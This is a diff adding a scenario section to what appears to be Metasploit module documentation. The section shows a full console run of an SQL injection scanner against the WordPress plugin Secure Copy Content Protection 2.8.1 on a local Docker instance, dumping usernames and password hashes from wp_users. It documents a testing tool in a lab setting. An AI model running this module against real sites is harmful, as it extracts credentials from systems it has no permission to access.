@@ -75,3 +75,54 @@ wp_users
 [*] Scanned 1 of 1 hosts (100% complete)
 [*] Auxiliary module execution completed
 ```
+
+### Secure Copy Content Protection and Content Locking 2.8.1 on WordPress 5.9.1 on Docker
+```
+msf6 payload(windows/x64/meterpreter/reverse_tcp) > use auxiliary/scanner/http/wp_secure_copy_content_protection_sqli
+msf6 auxiliary(scanner/http/wp_secure_copy_content_protection_sqli) > set RHOSTS 127.0.0.1
+RHOSTS => 127.0.0.1
+msf6 auxiliary(scanner/http/wp_secure_copy_content_protection_sqli) > set RPORT 8000
+RPORT => 8000
+msf6 auxiliary(scanner/http/wp_secure_copy_content_protection_sqli) > show options
+
+Module options (auxiliary/scanner/http/wp_secure_copy_content_protection_sqli):
+
+   Name        Current Setting  Required  Description
+   ----        ---------------  --------  -----------
+   Proxies                      no        A proxy chain of format type:host:port[,type:host:port][...]
+   RHOSTS      127.0.0.1        yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metas
+                                          ploit
+   RPORT       8000             yes       The target port (TCP)
+   SSL         false            no        Negotiate SSL/TLS for outgoing connections
+   TARGETURI   /                yes       The base path to the wordpress application
+   THREADS     1                yes       The number of concurrent threads (max one per host)
+   USER_COUNT  3                yes       Number of user credentials to enumerate
+   VHOST                        no        HTTP server virtual host
+
+
+Auxiliary action:
+
+   Name        Description
+   ----        -----------
+   List Users  Queries username, password hash for USER_COUNT users
+
+
+msf6 auxiliary(scanner/http/wp_secure_copy_content_protection_sqli) > run
+
+[*] Running automatic check ("set AutoCheck false" to disable)
+[+] The target appears to be vulnerable.
+[*] Enumerating Usernames and Password Hashes
+[!] Each user will take about 5-10 minutes to enumerate. Be patient.
+[+] Dumped table contents:
+wp_users
+========
+
+ user_login  user_pass
+ ----------  ---------
+ normal      $P$Bu9/XNK93oyUTKO.zJ9yGZfYAcbZg9.
+ testAdmin   $P$BYWtZOfh8yqLCKA877hwBysqGdRtk/.
+
+[*] Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+msf6 auxiliary(scanner/http/wp_secure_copy_content_protection_sqli) >
+```
